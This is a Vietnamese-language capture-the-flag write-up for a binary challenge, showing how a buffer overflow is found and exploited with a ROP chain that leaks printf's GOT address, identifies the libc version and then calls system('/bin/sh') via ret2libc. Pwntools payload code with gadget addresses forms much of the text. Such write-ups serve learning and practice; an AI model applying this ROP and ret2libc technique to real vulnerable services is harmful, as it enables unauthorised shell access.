# GAGA format string

Kiểm tra security cơ bản của chương trình :

![image](https://user-images.githubusercontent.com/93699926/234168897-27fe429b-c7e1-4d83-ba8f-2012e4baba7a.png)

Kiẻm tra chương trình trong iDA ta thấy chương trình co lỗi buffer overflow như sau :

![image](https://user-images.githubusercontent.com/93699926/234169166-c0fe6553-e1bb-4db5-ac72-cb05e604aa7b.png)

Vì chương trình khônng có function win hay hàm system nào để ta có thể lấy shell nên ta sẽ phải thực hiện kỹ thuật ret2ibc để gọi hàm sytem("/bin/sh") để lấy shell 
. Và để thực hiện kỹ thuật này thì ta cần phải biết trên sever chạy phiên bản libc nào:

# Ý tưởng như sau :
leak địa chỉ got của một hàm (VD như printf ) và đem lên trang này để kiểm tra và tìm kiếm phiên bản libc: https://libc.blukat.me/

Sau đó ta chỉ cần gọi hàm system(/bin/sh) thì có thể lấy được shell

Bước 1: sử dung `ropper --f gaga2` ta tìm được các gadget sau : 
```python
offset=0x48
pop_rdi=0x00000000004012b3
printf_plt=0x4010c0
ret=0x000000000040101a
pop_rsi_r15=0x00000000004012b1
offset=0x48
payload=b"A"*offset+flat(
    pop_rdi,exe.got['printf'],
    ret,
    printf_plt,exe.sym['main']+5
    )
p.sendlineafter(b"Your input: ",payload)
leak=int.from_bytes(p.recvuntil(b"Awesome!",drop=True),'little')
log.info('[+]printf:'+hex(leak))
```
sau khi chạy trên server thì ta tìm leak được địa chỉ got như sau :

![image](https://user-images.githubusercontent.com/93699926/234170282-086e6561-524e-4d56-93e2-46b31ca9b758.png)

đem lên trang tìm kiếm libc ta được kết quả :

![image](https://user-images.githubusercontent.com/93699926/234170362-71a02924-4e86-47d1-b1c3-66c24d55a081.png)

ta thấy phiên bản  libc6_2.31-0ubuntu9.9_amd64.so vô cùng SUS nên ta sẽ download về và chạy thử 

Bước 2 : ta sẽ tính libc base address và sẽ tìm được địa chỉ của string b'/bin/sh' và địa chỉ hàm system trong file libc .Vậy thì chỉ cần ret2libc nữa là xong

```python
libc.address=leak-libc.sym['printf']
log.info('[+]libc base:'+hex(libc.address))
payload=b"A"*offset+flat(
    pop_rdi,next(libc.search(b'/bin/sh')),
    pop_rsi_r15,0,0,
    libc.sym['system'],ret
    )
p.sendlineafter(b"Your input: ",payload)
```
full script in p.py!
chạy chương trình trên sever ta có flag :

![image](https://user-images.githubusercontent.com/93699926/234170877-26c7e800-db18-4405-bb50-e2a0aaa85bfe.png)


